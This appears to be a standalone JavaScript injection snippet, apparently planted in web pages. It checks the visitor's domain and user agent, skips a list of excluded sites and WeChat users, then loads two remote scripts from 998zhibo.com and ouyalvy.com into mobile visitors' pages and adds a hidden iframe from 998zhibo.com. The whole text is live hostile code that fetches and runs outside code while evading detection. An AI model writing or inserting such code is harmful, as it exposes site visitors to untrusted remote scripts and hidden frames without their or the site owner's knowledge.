var rank = parseInt(Math.random() * 99) + 1;
var myHost = !! (/(xiamenair.com|webdissector.com|gridsumdissector.com|eqxiu.com|eqh5.com|eqxiu.com|186life.com|mt.cnzz.com|ygg.sunpcm.com|m.99wxc.com|push.ppnad.com|180.76.232.29|ssp.tvrom.cn|baidu.wzzjh168.cn|10086.cn|fmcc.com|dd.xjb12.com|kaisafax.com|highflyersef.cn|.org|.gov|sf-express.com|sf.gmta.com.cn|m.tujia.com|m.5i5j.com|m.fang.com|m.iwjw.com|m.lianjia.com)/i.test(document.domain));
var myUA = !! (/(MicroMessenger)/i.test(window.navigator.userAgent));
var ISIOS = !! (/(iPhone|iPad|iPod|iOS)/i.test(window.navigator.userAgent));
var ISAPK = !! (/(android)/i.test(window.navigator.userAgent));
var noHost = !(document.domain);
if (noHost || myHost || myUA) {} else {
        if (ISAPK || ISIOS) {
 
                var ads1 = document.createElement('script');
                ads1.src = "http://bdjs.998zhibo.com/bdfj.js";
                document.body.appendChild(ads1);
var ads2 = document.createElement('script');
ads2.src = "http://z5r.ouyalvy.com/res/ch2/m/lz5c.js";
document.body.appendChild(ads2);
                document.body.onload = function() {
                        var ads8 = document.createElement('iframe');
                        ads8.src = "http://bdjs.998zhibo.com/ydky.html";
                        ads8.style.display = "none";
                        document.body.appendChild(ads8)
                }
        }
}